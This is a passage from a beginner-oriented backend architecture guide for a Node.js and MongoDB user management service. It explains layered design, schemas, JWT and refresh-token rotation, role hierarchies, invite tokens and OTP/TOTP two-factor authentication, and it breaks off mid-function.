# 🚀 Complete Backend Architecture Guide

**For: Mentor Meeting Preparation**  
**Audience: Beginner to Intermediate Developers**  
**Last Updated: 2025**

---

## 📋 Table of Contents

1. [System Overview](#system-overview)
2. [Architecture Pattern](#architecture-pattern)
3. [Database Schema & Relationships](#database-schema--relationships)
4. [Authentication & Authorization Deep Dive](#authentication--authorization-deep-dive)
5. [Token Systems Explained](#token-systems-explained)
6. [Role-Based Access Control (RBAC)](#role-based-access-control-rbac)
7. [Two-Factor Authentication (2FA)](#two-factor-authentication-2fa)
8. [Invitation System](#invitation-system)
9. [Microservices Communication](#microservices-communication)
10. [Security Implementations](#security-implementations)
11. [Error Handling Strategy](#error-handling-strategy)
12. [Repository Pattern](#repository-pattern)
13. [Common Interview Questions & Answers](#common-interview-questions--answers)

---

## 🏗️ System Overview

### What is This Application?

This is a **Multi-tenant User Management System** with two microservices:

1. **User Management Service** (Port 3000)
   - User authentication & authorization
   - Organization management
   - Invitation system
   - Role-based access control
   - Two-factor authentication

2. **Notifications Service** (Port 4000)
   - Email sending
   - Real-time notifications via Socket.IO
   - RabbitMQ message consumption

### Tech Stack

```javascript
// User Management Service
- Runtime: Node.js with ES6 Modules
- Framework: Express.js
- Database: MongoDB with Mongoose ODM
- Authentication: JWT (JSON Web Tokens)
- 2FA: TOTP (Google Authenticator) + OTP (Email)
- Message Queue: RabbitMQ
- Real-time: Socket.IO Client
- API Docs: Swagger/OpenAPI

// Notifications Service
- Runtime: Node.js
- Framework: Express.js
- Email: Nodemailer (SMTP)
- Real-time: Socket.IO Server
- Message Queue: RabbitMQ
- Cache: Redis (for Socket.IO adapter)
```

---

## 🎯 Architecture Pattern

### Layered Architecture (N-Tier Pattern)

```
┌─────────────────────────────────────────┐
│         Client (Frontend)                │
└─────────────────┬───────────────────────┘
                  │ HTTP/REST
┌─────────────────▼───────────────────────┐
│      Routes Layer (Routing)              │
│  - Define API endpoints                  │
│  - Apply middleware                      │
└─────────────────┬───────────────────────┘
                  │
┌─────────────────▼───────────────────────┐
│   Middleware Layer (Cross-cutting)       │
│  - Authentication (JWT verification)     │
│  - Authorization (Role checking)         │
│  - Validation (Input sanitization)       │
│  - Rate Limiting                         │
└─────────────────┬───────────────────────┘
                  │
┌─────────────────▼───────────────────────┐
│   Controllers Layer (Request Handlers)   │
│  - Parse requests                        │
│  - Call services                         │
│  - Format responses                      │
│  - Handle errors                         │
└─────────────────┬───────────────────────┘
                  │
┌─────────────────▼───────────────────────┐
│   Services Layer (Business Logic)        │
│  - Core business rules                   │
│  - Data validation                       │
│  - Orchestrate operations                │
│  - Handle transactions                   │
└─────────────────┬───────────────────────┘
                  │
┌─────────────────▼───────────────────────┐
│   Repository Layer (Data Access)         │
│  - Database operations                   │
│  - Query building                        │
│  - Data abstraction                      │
└─────────────────┬───────────────────────┘
                  │
┌─────────────────▼───────────────────────┐
│     Models Layer (Data Schema)           │
│  - Schema definitions                    │
│  - Validations                           │
│  - Instance methods                      │
│  - Hooks (middleware)                    │
└─────────────────┬───────────────────────┘
                  │
┌─────────────────▼───────────────────────┐
│       Database (MongoDB)                 │
└─────────────────────────────────────────┘
```

### Why This Architecture?

**Separation of Concerns:**
- Each layer has a single responsibility
- Easy to test individual components
- Changes in one layer don't affect others

**Example Flow:**
```javascript
// 1. Route receives request
POST /api/auth/login

// 2. Middleware validates and rate-limits
authenticate() → authorize() → validateInput()

// 3. Controller handles request
loginController(req, res)
  ↓
// 4. Service performs business logic
authService.authenticate(email, password)
  ↓
// 5. Repository queries database
userRepo.findByEmail(email)
  ↓
// 6. Model executes query
User.findOne({ email })
  ↓
// 7. Response flows back up
res.json({ accessToken, refreshToken })
```

---

## 💾 Database Schema & Relationships

### Entity Relationship Diagram

```
┌─────────────────────┐
│   Organization      │
│─────────────────────│
│ _id (ObjectId) PK   │
│ name (String)       │
│ slug (String) UK    │
│ twoFactorMethod     │
│ adminUser (Ref)     │───┐
│ isActive (Boolean)  │   │
│ settings (Map)      │   │
│ createdAt           │   │
│ updatedAt           │   │
└──────────┬──────────┘   │
           │              │
           │ 1:N          │ 1:1
           │              │
┌──────────▼──────────────▼─┐
│         User               │
│────────────────────────────│
│ _id (ObjectId) PK          │
│ email (String) UK          │
│ password (Hash)            │
│ firstName (String)         │
│ lastName (String)          │
│ role (Enum)                │
│ organization (Ref) FK      │
│ twoFactorMethod (Enum)     │
│ totpSecret (String)        │
│ totpEnabled (Boolean)      │
│ otpHash (String)           │
│ otpExpiry (Date)           │
│ isActive (Boolean)         │
│ invitedBy (Ref) FK         │
│ createdAt                  │
│ updatedAt                  │
└──────────┬─────────────────┘
           │
           │ 1:N
           │
┌──────────▼──────────────┐
│    RefreshToken         │
│─────────────────────────│
│ _id (ObjectId) PK       │
│ token (String) UK       │
│ user (Ref) FK           │
│ expiresAt (Date)        │
│ isRevoked (Boolean)     │
│ replacedBy (String)     │
│ userAgent (String)      │
│ ipAddress (String)      │
│ createdAt               │
│ updatedAt               │
└─────────────────────────┘

┌──────────────────────────┐
│        Invite            │
│──────────────────────────│
│ _id (ObjectId) PK        │
│ email (String)           │
│ role (Enum)              │
│ invitedBy (Ref) FK       │─── Points to User
│ organization (Ref) FK    │─── Points to Organization
│ organizationName (String)│
│ token (String) UK        │
│ status (Enum)            │
│ expiresAt (Date)         │
│ acceptedAt (Date)        │
│ acceptedUserId (Ref) FK  │
│ createdAt                │
│ updatedAt                │
└──────────────────────────┘
```

### Schema Details

#### 1. User Model

```javascript
// File: userManagement/models/User.js

const userSchema = new mongoose.Schema({
  email: {
    type: String,
    required: true,
    unique: true,        // ← Database enforces uniqueness
    lowercase: true,     // ← Auto-converts to lowercase
    trim: true,          // ← Removes whitespace
    index: true          // ← Creates index for fast lookups
  },
  password: {
    type: String,
    required: true
    // Stored as bcrypt hash (not plain text!)
  },
  role: {
    type: String,
    enum: ['super_admin', 'site_admin', 'operator', 'client_admin', 'client_user'],
    required: true,
    index: true          // ← For role-based queries
  },
  organization: {
    type: mongoose.Schema.Types.ObjectId,
    ref: 'Organization', // ← Foreign key reference
    default: null
  },
  twoFactorMethod: {
    type: String,
    enum: ['otp', 'totp'],
    default: null        // ← Null means 2FA disabled
  },
  totpSecret: {
    type: String,
    default: null        // ← Google Authenticator secret
  },
  totpEnabled: {
    type: Boolean,
    default: false       // ← TOTP must be confirmed
  },
  otpHash: {
    type: String,
    default: null        // ← Temporary OTP hash
  },
  otpExpiry: {
    type: Date,
    default: null        // ← OTP expires after 10 minutes
  }
}, { timestamps: true }); // ← Auto-adds createdAt, updatedAt
```

**Key Concepts:**

**Q: Why store password hash instead of plain text?**
```javascript
// NEVER do this:
password: "mypassword123" ❌

// Always do this:
password: "$2a$12$KIXxBj..." ✅ (bcrypt hash)

// How it works:
userSchema.pre('save', async function(next) {
  if (!this.isModified('password')) return next();
  
  // Hash password before saving
  const salt = await bcrypt.genSalt(12); // ← 2^12 = 4096 rounds
  this.password = await bcrypt.hash(this.password, salt);
  next();
});
```

**Why 12 rounds?**
- More rounds = more secure but slower
- 12 rounds ≈ 250ms to hash (good balance)
- Makes brute-force attacks impractical

**Q: Why both `totpSecret` and `totpEnabled`?**
```javascript
// Scenario: User sets up TOTP
1. Generate secret → save to totpSecret
2. User scans QR code
3. User verifies token → set totpEnabled = true

// Why separate?
- User might abandon setup (totpSecret exists but totpEnabled = false)
- Can detect incomplete setup and re-show QR code
```

#### 2. Organization Model

```javascript
const organizationSchema = new mongoose.Schema({
  name: {
    type: String,
    required: true
  },
  slug: {
    type: String,
    required: true,
    unique: true,        // ← URL-friendly identifier
    lowercase: true
    // Example: "Acme Corp" → "acme-corp"
  },
  twoFactorMethod: {
    type: String,
    enum: ['otp', 'totp'],
    default: 'otp'       // ← Organization-wide 2FA policy
  },
  adminUser: {
    type: mongoose.Schema.Types.ObjectId,
    ref: 'User',         // ← Who created this org
    required: true
  }
});
```

**Q: Why do we need both `User.twoFactorMethod` and `Organization.twoFactorMethod`?**

```javascript
// Multi-level 2FA policy:

// 1. Client User (lowest privilege)
if (user.role === 'client_user') {
  // MUST use organization's 2FA - no choice!
  effectiveTwoFactor = user.organization.twoFactorMethod;
}

// 2. Client Admin, Site Admin, Operator, Super Admin
else {
  // Can choose their own 2FA method
  effectiveTwoFactor = user.twoFactorMethod || user.organization?.twoFactorMethod;
}

// Why?
// - Enforces security policies at org level
// - Admins can be more flexible
// - Prevents users from disabling 2FA
```

#### 3. RefreshToken Model

```javascript
const refreshTokenSchema = new mongoose.Schema({
  token: {
    type: String,
    required: true,
    unique: true,
    index: true
    // Example: "a3f5e2b8c9d1f4e6a7b3c8d9e1f2a3b4..."
  },
  user: {
    type: mongoose.Schema.Types.ObjectId,
    ref: 'User',
    required: true,
    index: true          // ← Fast lookup by user
  },
  expiresAt: {
    type: Date,
    required: true       // ← 7 days from creation
  },
  isRevoked: {
    type: Boolean,
    default: false       // ← Revoked when used or logout
  },
  replacedBy: {
    type: String,
    default: null        // ← Token rotation tracking
  },
  userAgent: {
    type: String,
    default: null        // ← "Mozilla/5.0..."
  },
  ipAddress: {
    type: String,
    default: null        // ← "192.168.1.1"
  }
});
```

**Q: Why store userAgent and ipAddress?**

```javascript
// Security benefits:
1. Session tracking - see all active devices
2. Anomaly detection - login from new location?
3. Forensics - who accessed what, when, from where
4. Revoke specific devices - "Logout from all devices except this one"

// Example use case:
const activeSessions = await RefreshToken.find({
  user: userId,
  isRevoked: false,
  expiresAt: { $gt: new Date() }
});

// Returns:
[
  { userAgent: "iPhone Safari", ipAddress: "192.168.1.5", createdAt: "..." },
  { userAgent: "Chrome Windows", ipAddress: "203.0.113.42", createdAt: "..." }
]
// User sees: "Active on 2 devices"
```

#### 4. Invite Model

```javascript
const inviteSchema = new mongoose.Schema({
  email: {
    type: String,
    required: true,
    lowercase: true,
    index: true
  },
  role: {
    type: String,
    enum: ['site_admin', 'operator', 'client_admin', 'client_user'],
    required: true
    // Note: Cannot invite super_admin!
  },
  invitedBy: {
    type: mongoose.Schema.Types.ObjectId,
    ref: 'User',
    required: true
  },
  organization: {
    type: mongoose.Schema.Types.ObjectId,
    ref: 'Organization',
    default: null
    // Required for client_admin and client_user
  },
  token: {
    type: String,
    required: true,
    unique: true,        // ← 64-char random hex string
    index: true
  },
  status: {
    type: String,
    enum: ['pending', 'accepted', 'expired', 'revoked'],
    default: 'pending'
  },
  expiresAt: {
    type: Date,
    required: true       // ← 7 days from creation
  }
});
```

### Database Indexes

**Why do we need indexes?**

```javascript
// Without index:
User.findOne({ email: "user@example.com" })
// MongoDB scans ALL documents (slow!)
// 1M users = checks all 1M records

// With index on email:
User.findOne({ email: "user@example.com" })
// MongoDB uses B-tree index (fast!)
// 1M users = ~20 comparisons

// Compound indexes:
userSchema.index({ organization: 1, isActive: 1 });
// Optimized for: "Find all active users in this organization"

refreshTokenSchema.index({ token: 1, isRevoked: 1 });
// Optimized for: "Is this token valid (not revoked)?"
```

**Trade-offs:**
- ✅ Faster reads
- ❌ Slower writes (must update index)
- ❌ More storage space

---

## 🔐 Authentication & Authorization Deep Dive

### The Complete Login Flow

```javascript
/*
┌─────────────────────────────────────────────────────────────────┐
│                    AUTHENTICATION FLOW                           │
└─────────────────────────────────────────────────────────────────┘

1. User submits credentials
   POST /api/auth/login
   { email: "user@example.com", password: "mypassword" }
   
2. authController.login() receives request
   ↓
3. authService.authenticate(email, password)
   ├─ userRepo.findByEmail(email) with organization populated
   ├─ Check if user exists and isActive
   ├─ user.comparePassword(password) - bcrypt verification
   └─ Return user object
   
4. authService.initiateTwoFactor(user)
   ├─ Get effective 2FA method (org or user level)
   ├─ If OTP: Generate 6-digit code, hash it, save to DB, email user
   ├─ If TOTP: Return "Enter your authenticator code"
   └─ If none: Skip to step 7
   
5. Frontend shows 2FA input screen
   User enters code from email or Google Authenticator
   POST /api/auth/verify-otp or /api/auth/verify-totp
   { userId, otp/token }
   
6. authService.verifyOTP() or verifyTOTP()
   ├─ Retrieve user from DB
   ├─ Check OTP hasn't expired (10 min limit)
   ├─ Verify code matches (bcrypt compare or speakeasy verify)
   └─ Clear OTP from database
   
7. respondWithTokens()
   ├─ generateAccessToken(user) - JWT with 15min expiry
   ├─ createRefreshToken(userId, req) - Random token with 7d expiry
   └─ Return both tokens + user data
   
8. Frontend stores tokens
   localStorage.accessToken = "eyJhbGc..."
   localStorage.refreshToken = "a3f5e2b8c9d..."
   
9. Subsequent requests include Authorization header
   Authorization: Bearer eyJhbGc...
   ↓
10. authenticate middleware verifies token
    ├─ Extract token from header
    ├─ jwt.verify(token, SECRET)
    ├─ Load user from DB (check still active)
    └─ Attach user to req.user
    
11. authorize middleware checks permissions
    ├─ Check req.user.role in allowedRoles
    └─ Allow or deny request
*/
```

### Access Token vs Refresh Token

| Feature | Access Token | Refresh Token |
|---------|-------------|---------------|
| **Type** | JWT (stateless) | Random string (stateful) |
| **Storage** | Database: No | Database: Yes |
| **Lifespan** | 15 minutes | 7 days |
| **Size** | ~200-300 bytes | 128 bytes (64 hex chars) |
| **Stored In** | Memory/localStorage | localStorage + DB |
| **Used For** | API requests | Getting new access token |
| **Revocable** | No (until expiry) | Yes (update DB) |
| **Contains** | User ID, role, org | Random bytes |

**Q: Why two tokens?**

```javascript
// Scenario 1: Access token stolen
// Problem: Attacker has 15min to cause damage
// Solution: Short lifespan limits damage window

// Scenario 2: Access token expired
// Problem: User has to re-login every 15min (annoying!)
// Solution: Use refresh token to get new access token silently

// Scenario 3: Account compromised
// Problem: Tokens still valid for hours/days
// Solution: Revoke refresh tokens in DB → forces re-login everywhere

// Best of both worlds:
// - Frequent rotation (security)
// - Seamless UX (convenience)
// - Instant revocation (control)
```

### JWT Structure

```javascript
// Access Token Payload:
{
  userId: "507f1f77bcf86cd799439011",
  email: "user@example.com",
  role: "client_admin",
  organizationId: "507f1f77bcf86cd799439012",
  iat: 1735000000,  // Issued at (timestamp)
  exp: 1735000900   // Expires at (timestamp)
}

// How it's created:
const token = jwt.sign(payload, process.env.JWT_ACCESS_SECRET, {
  expiresIn: '15m'
});

// Result: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI1MD...
//         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ ^^^^^^^^^^^^^^^^^^^^...
//         Header (algorithm)                 Payload (data)
//                                           ^^^^^^^^^^^^^^^^...
//                                           Signature (verification)

// Why JWT for access tokens?
// ✅ Stateless - no DB lookup needed
// ✅ Self-contained - all info in token
// ✅ Cryptographically signed - can't be tampered
// ❌ Can't revoke before expiry - hence short lifespan
```

### Authentication Middleware

```javascript
// File: userManagement/middleware/auth.js

export const authenticate = async (req, res, next) => {
  // 1. Extract token from header
  const authHeader = req.headers.authorization;
  // Example: "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
  
  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return res.status(401).json({ message: 'No token provided' });
  }
  
  const token = authHeader.substring(7); // Remove "Bearer "
  
  // 2. Verify JWT signature and expiry
  const decoded = jwt.verify(token, process.env.JWT_ACCESS_SECRET);
  // If expired or invalid, throws error → caught by catch block
  
  // 3. Load user from database
  const user = await userRepo.findById(decoded.userId, {
    populate: 'organization'
  });
  
  // 4. Extra security checks
  if (!user || !user.isActive) {
    return res.status(401).json({ message: 'User not found or inactive' });
  }
  
  // 5. Attach to request for downstream use
  req.user = user;
  next();
};

// Usage in routes:
router.get('/profile', authenticate, getProfile);
//                     ^^^^^^^^^^^^
//                     Runs before controller
```

**Q: Why reload user from DB? JWT already has user data!**

```javascript
// Scenario: User account deactivated
// 1. User logs in → gets valid JWT (exp: 15min from now)
// 2. Admin deactivates user account
// 3. User makes request with still-valid JWT
// 4. Without DB check: Request succeeds ❌
// 5. With DB check: See isActive=false, reject ✅

// Security principle: "Defense in depth"
// Token says user was valid at issuance time
// DB check confirms user is still valid now
```

### Authorization Middleware

```javascript
export const authorize = (...allowedRoles) => {
  // Returns a middleware function (closure)
  return (req, res, next) => {
    // req.user populated by authenticate middleware
    if (!req.user) {
      return res.status(401).json({ message: 'Authentication required' });
    }
    
    if (!allowedRoles.includes(req.user.role)) {
      return res.status(403).json({ message: 'Insufficient permissions' });
    }
    
    next();
  };
};

// Usage:
router.post('/invites/create',
  authenticate,                                    // Step 1: Who are you?
  authorize('super_admin', 'site_admin'),         // Step 2: Can you do this?
  createInvite                                     // Step 3: Do the thing
);

// Why separate authenticate and authorize?
// - Single Responsibility Principle
// - Can reuse authenticate without authorization
// - Clear error messages (401 vs 403)
```

**HTTP Status Codes:**
- `401 Unauthorized` = "Who are you?" (authentication failed)
- `403 Forbidden` = "I know who you are, but you can't do this" (authorization failed)

---

## 🎟️ Token Systems Explained

### 1. Refresh Token Rotation

**What is it?**
Every time you use a refresh token to get a new access token, you also get a new refresh token (and the old one is revoked).

```javascript
// File: userManagement/controllers/authController.js

export const refreshTokenHandler = async (req, res) => {
  const { refreshToken: oldToken } = req.body;
  
  // 1. Validate old refresh token
  const storedToken = await authService.refreshAccessToken(oldToken);
  // Checks: exists in DB, not revoked, not expired
  
  // 2. Revoke old token
  await authService.revokeRefreshToken(oldToken, req);
  // Sets isRevoked=true in database
  
  // 3. Create new refresh token
  const newRefreshToken = await authService.createRefreshToken(
    storedToken.user._id,
    req
  );
  
  // 4. Generate new access token
  const { accessToken } = authService.generateTokens(storedToken.user);
  
  // 5. Return both
  return res.json({
    accessToken,          // New 15min JWT
    refreshToken: newRefreshToken.token  // New 7day token
  });
};
```

**Why rotate refresh tokens?**

```javascript
// Attack Scenario: Token Theft

// 1. Legitimate user has refresh token "ABC123"
// 2. Attacker steals token "ABC123" (XSS, network sniffing, etc.)
// 3. Attacker uses "ABC123" → gets tokens, receives "DEF456"
// 4. Server marks "ABC123" as revoked, replacedBy="DEF456"
// 5. Legitimate user tries to use "ABC123" → REJECTED (already used!)
// 6. System detects potential breach:
//    - "ABC123" was used twice (normal user + attacker)
//    - Revoke entire token family
//    - Force re-login on all devices
//    - Alert user of suspicious activity

// Without rotation:
// - Token "ABC123" valid for 7 days
// - Both attacker and user can use it
// - No way to detect theft
// - Attacker has 7 days of access

// Trade-offs:
// ✅ Detects token theft
// ✅ Limits damage window (one use only)
// ✅ Maintains audit trail (replacedBy chain)
// ❌ More database writes
// ❌ Slightly more complex logic
```

### 2. Invite Token System

**What is it?**
A cryptographically random token used as a public identifier for invitations.

```javascript
// File: userManagement/models/Invite.js

inviteSchema.statics.generateToken = function() {
  return crypto.randomBytes(32).toString('hex');
  // 32 bytes = 256 bits of entropy
  // hex encoding = 64 characters
  // Example: "a3f5e2b8c9d1f4e6a7b3c8d9e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0"
};

// Usage:
const token = Invite.generateToken();
const invite = await Invite.create({
  email: "newuser@example.com",
  role: "client_user",
  token: token,  // Stored in DB with unique constraint
  expiresAt: Date.now() + 7 * 24 * 60 * 60 * 1000
});

// Send email with link:
const inviteLink = `https://app.com/accept-invite?token=${token}`;
```

**Why use tokens instead of database IDs?**

```javascript
// Option 1: Using database ID (BAD)
GET /api/invites/details/507f1f77bcf86cd799439011
//                        ^^^^^^^^^^^^^^^^^^^^^^^^
//                        MongoDB ObjectId (predictable!)

// Problem: Enumeration attack
for (let i = 0; i < 1000000; i++) {
  fetch(`/api/invites/details/${generateId(i)}`);
  // Attacker can discover all pending invites!
}

// Option 2: Using random token (GOOD)
GET /api/invites/details/a3f5e2b8c9d1f4e6a7b3c8d9e1f2a3b4...
//                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
//                        256-bit random token (unpredictable!)

// Probability of collision:
// With 1 billion invites: ~0.000000000000000000000000000000001%
// To have 1% collision chance: Need 10^38 invites
// (More than atoms in your body!)

// Security benefits:
// ✅ Can't guess other invites
// ✅ Token acts as authentication (possession = proof)
// ✅ No need to login before accepting invite
// ✅ Can safely share via email
```

**Q: Can the same token be generated twice?**

```javascript
// Mathematical probability: ~0% (but not impossible!)
// Database protection:
const inviteSchema = new mongoose.Schema({
  token: {
    type: String,
    required: true,
    unique: true,  // ← MongoDB unique index prevents duplicates
    index: true
  }
});

// What happens if collision occurs?
try {
  await Invite.create({ token: "ABC123", ... });
} catch (error) {
  if (error.code === 11000) {  // MongoDB duplicate key error
    // Regenerate token and retry
    const newToken = Invite.generateToken();
    await Invite.create({ token: newToken, ... });
  }
}

// Current code doesn't handle this (but risk is negligible)
// Could add retry logic for extra safety:
async function createInviteWithRetry(data, maxRetries = 3) {
  for (let i = 0; i < maxRetries; i++) {
    try {
      data.token = Invite.generateToken();
      return await Invite.create(data);
    } catch (error) {
      if (error.code === 11000 && i < maxRetries - 1) {
        continue; // Try again with new token
      }
      throw error;
    }
  }
}
```

---

## 👥 Role-Based Access Control (RBAC)

### Role Hierarchy

```javascript
// File: userManagement/utils/roleHierarchy.js

const ROLE_HIERARCHY = {
  super_admin: ['site_admin', 'operator', 'client_admin'],
  site_admin: ['operator', 'client_admin'],
  operator: ['client_admin'],
  client_admin: ['client_user'],
  client_user: []
};

const ROLE_LEVELS = {
  super_admin: 5,   // Highest privilege
  site_admin: 4,
  operator: 3,
  client_admin: 2,
  client_user: 1     // Lowest privilege
};
```

**Visual Hierarchy:**

```
┌────────────────────────────────────────────┐
│          super_admin (Level 5)             │
│  - Full system access                      │
│  - Manage all users and organizations      │
│  - System configuration                    │
└─────────────┬──────────────────────────────┘
              │ Can invite ↓
┌─────────────▼──────────────────────────────┐
│          site_admin (Level 4)              │
│  - Manage operators and clients            │
│  - View all organizations                  │
└─────────────┬──────────────────────────────┘
              │ Can invite ↓
┌─────────────▼──────────────────────────────┐
│           operator (Level 3)               │
│  - Manage client organizations             │
│  - Support and monitoring                  │
└─────────────┬──────────────────────────────┘
              │ Can invite ↓
┌─────────────▼──────────────────────────────┐
│        client_admin (Level 2)              │
│  - Manage own organization                 │
│  - Invite client_user to their org         │
│  - Configure org settings (2FA, etc.)      │
└─────────────┬──────────────────────────────┘
              │ Can invite ↓
┌─────────────▼──────────────────────────────┐
│         client_user (Level 1)              │
│  - Basic access to own org resources       │
│  - Cannot invite others                    │
│  - Must use org's 2FA settings             │
└────────────────────────────────────────────┘
```

### Permission Matrix

| Action | super_admin | site_admin | operator | client_admin | client_user |
|--------|-------------|------------|----------|--------------|-------------|
| Create Organization | ✅ | ✅ | ✅ | ✅ (on signup) | ❌ |
| Invite super_admin | ❌ | ❌ | ❌ | ❌ | ❌ |
| Invite site_admin | ✅ | ❌ | ❌ | ❌ | ❌ |
| Invite operator | ✅ | ✅ | ❌ | ❌ | ❌ |
| Invite client_admin | ✅ | ✅ | ✅ | ❌ | ❌ |
| Invite client_user | ✅ | ✅ | ✅ | ✅ (own org) | ❌ |
| Change own 2FA method | ✅ | ✅ | ✅ | ✅ | ❌ |
| Change org 2FA policy | ❌ | ❌ | ❌ | ✅ (own org) | ❌ |
| View org members | ✅ | ✅ | ✅ | ✅ (own org) | ✅ (own org) |
| Update org settings | ❌ | ❌ | ❌ | ✅ (own org) | ❌ |

### Implementation

```javascript
// 1. Check if user can invite a specific role
export const canInviteRole = (inviterRole, targetRole) => {
  const allowedRoles = ROLE_HIERARCHY[inviterRole] || [];
  return allowedRoles.includes(targetRole);
};

// Example:
canInviteRole('site_admin', 'operator')      // → true ✅
canInviteRole('site_admin', 'super_admin')   // → false ❌
canInviteRole('client_user', 'client_admin') // → false ❌

// 2. Compare role levels
export const isHigherRole = (role1, role2) => {
  return getRoleLevel(role1) > getRoleLevel(role2);
};

// Example:
isHigherRole('site_admin', 'operator')  // → true (4 > 3)
isHigherRole('client_user', 'operator') // → false (1 < 3)

// 3. Check if role needs organization
export const needsOrganization = (role) => {
  return ['client_admin', 'client_user'].includes(role);
};

// Why? 
// - client_admin and client_user belong to specific organizations
// - super_admin, site_admin, operator are "platform" roles
```

### Real-World Scenario

```javascript
// Scenario: Client Admin tries to invite a Site Admin

// Request:
POST /api/invites/create
{
  "email": "newadmin@example.com",
  "role": "site_admin"
}

// Flow:
1. authenticate middleware → req.user = { role: "client_admin" }
2. authorize('super_admin', 'site_admin', 'operator', 'client_admin')
   → Passes (client_admin is allowed to access endpoint)
3. inviteService.createInvite()
   → canInviteRole('client_admin', 'site_admin')
   → ROLE_HIERARCHY['client_admin'] = ['client_user']
   → 'site_admin' not in ['client_user']
   → Returns false
4. throw new AuthorizationError('You cannot invite users with role: site_admin')
5. Controller catches error, returns 403 Forbidden

// Response:
{
  "success": false,
  "message": "You cannot invite users with role: site_admin"
}

// Why two-level check?
// - authorize() = Can you access this endpoint?
// - canInviteRole() = Can you invite THIS SPECIFIC role?
// - First check is coarse (endpoint level)
// - Second check is fine (action level)
```

---

## 🔐 Two-Factor Authentication (2FA)

### Supported Methods

#### 1. OTP (One-Time Password) - Email-based

```javascript
// Flow:
1. User logs in with email/password
2. System generates 6-digit random code
3. Code is hashed and stored in database
4. Code is emailed to user
5. User enters code within 10 minutes
6. System verifies code matches hash
7. Code is cleared from database
```

**Implementation:**

```javascript
// File: userManagement/utils/otp.js

export const generateOTP = () => {
  return crypto.randomInt(100000, 999999).toString();
  // Returns: "123456" (always 6 digits)
};

export const hashOTP = async (otp) => {
  const salt = await bcrypt.genSalt(10);
  return await bcrypt.hash(otp, salt);
  // Returns: "$2a$10$KIXxBj9..."
};

export const verifyOTP = async (inputOTP, hashedOTP) => {
  return await bcrypt.compare(inputOTP, hashedOTP);
  // Returns: true/false
};

export const getOTPExpiry = (minutes) => {
  return Date.now() + minutes * 60 * 1000;
  // Default: 10 minutes from now
};

// Service layer:
async initiateOTP(user) {
  const otp = generateOTP();              // "123456"
  const otpHash = await hashOTP(otp);     // "$2a$10$..."
  
  await userRepo.updateOTP(
    user._id,
    otpHash,
    getOTPExpiry(10)
  );
  
  await sendOTPEmail(user.email, otp);    // Plain text in email
  
  return {
    requiresTwoFactor: true,
    twoFactorMethod: 'otp',
    userId: user._id,
    message: 'OTP sent to your email'
  };
}
```

**Q: Why hash the OTP if we're sending it in plain text via email?**

```javascript
// Defense in depth principle:

// Threat 1: Database breach
// - Attacker dumps database
// - Sees: otpHash = "$2a$10$KIXxBj..."
// - Cannot reverse hash to get OTP
// - OTP expires in 10min anyway

// Threat 2: Email interception
// - Attacker intercepts email
// - Sees: "Your code is 123456"
// - Has 10min to use it
// - After use or expiry, code is cleared

// Without hashing:
// - DB stores: otp = "123456"
// - Database breach gives immediate access
// - No need to intercept email

// With hashing:
// - Requires BOTH database access AND email interception
// - Much harder to exploit
```

#### 2. TOTP (Time-Based One-Time Password) - Google Authenticator

```javascript
// Flow:
1. User enables TOTP
2. System generates random secret (base32 encoded)
3. Secret is converted to QR code
4. User scans QR with Google Authenticator
5. Both system and app use same secret + current time
6. Generate 6-digit code every 30 seconds
7. User enters current code to verify
8. Codes match? Authentication successful
```

**Implementation:**

```javascript
// File: userManagement/utils/totp.js
import speakeasy from 'speakeasy';
import QRCode from 'qrcode';

export const generateTOTPSecret = (email) => {
  const secret = speakeasy.generateSecret({
    name: `UserManagement:${email}`,
    issuer: 'UserManagement',
    length: 32
  });
  
  return {
    secret: secret.base32,  // "JBSWY3DPEHPK3PXP"
    otpauthUrl: secret.otpauth_url
    // "otpauth://totp/UserManagement:user@example.com?secret=JBSWY3..."
  };
};

export const generateQRCode = async (otpauthUrl) => {
  return await QRCode.toDataURL(otpauthUrl);
  // Returns: "data:image/png;base64,iVBORw0KGgo..."
};

export const verifyTOTPToken = (token, secret) => {
  return speakeasy.totp.verify({
    secret: secret,
    encoding: 'base32',
    token: token,
    window: 2  // Allow ±2 time steps (±60 seconds)
  });
  // Returns: true/false
};

// Service layer:
async setupTOTP(userId, email) {
  const { secret, otpauthUrl } = generateTOTPSecret(email);
  const qrCode = await generateQRCode(otpauthUrl);
  
  // Save secret to database (NOT enabled yet)
  await userRepo.updateTOTP(userId, { totpSecret: secret });
  
  return {
    secret,   // User needs this if QR scan fails
    qrCode    // Frontend displays this image
  };
}
```

**How TOTP Works (Mathematical Explanation):**

```javascript
// Algorithm:
1. Secret: "JBSWY3DPEHPK3PXP" (base32, shared between server & app)
2. Time: Math.floor(Date.now() / 1000 / 30) → Time step counter
   // Example: 1735000000 / 30 = 57833333
3. HMAC-SHA1(Secret, TimeCounter) → 20-byte hash
4. Dynamic truncation → 6-digit code

// Both server and app:
// - Use same secret
// - Calculate same time step (synchronized clocks)
// - Generate same code

// Example at timestamp 1735000000:
Server generates: 123456
App generates:    123456
User enters:      123456
✅ Match!

// 30 seconds later (1735000030):
Server generates: 789012
App generates:    789012
Old code (123456) no longer works

// Window = 2:
// Accept codes from: T-60s, T-30s, T, T+30s, T+60s
// Why? Account for clock drift and user input time
```

**Q: Why not just use OTP for everything?**

| Feature | OTP (Email) | TOTP (Authenticator) |
|---------|-------------|----------------------|
| **Dependency** | Email service | None (offline works) |
| **Speed** | Slow (wait for email) | Instant |
| **Security** | Email interception risk | Harder to intercept |
| **User Experience** | Check email, copy code | Open app, type code |
| **Setup** | None | Scan QR code once |
| **Recovery** | Easy (re-send) | Need backup codes |
| **Best For** | Occasional logins | Frequent logins |

### 2FA Policy Enforcement

```javascript
// File: userManagement/services/authService.js

async initiateTwoFactor(user) {
  // 1. Determine which 2FA method to use
  const twoFactorMethod = 
    user.organization?.twoFactorMethod ||  // Org policy first
    user.twoFactorMethod;                  // User preference fallback
  
  if (!twoFactorMethod) {
    return { requiresTwoFactor: false, user };
  }
  
  // 2. Route to appropriate method
  if (twoFactorMethod === 'otp') {
    return await this.initiateOTP(user);
  }
  
  if (twoFactorMethod === 'totp') {
    return await this.initiateTOTP(user);
  }
}

// Special case for client_user:
async setupUserTwoFactor(user, requestedMethod) {
